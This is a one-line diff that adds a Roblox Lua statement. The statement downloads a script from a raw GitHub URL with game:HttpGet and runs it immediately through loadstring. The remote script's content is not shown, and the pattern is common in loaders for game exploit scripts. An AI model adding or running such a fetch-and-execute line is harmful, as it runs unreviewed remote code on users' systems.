@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lorenxzx/CFrame/refs/heads/main/CFrame"))()
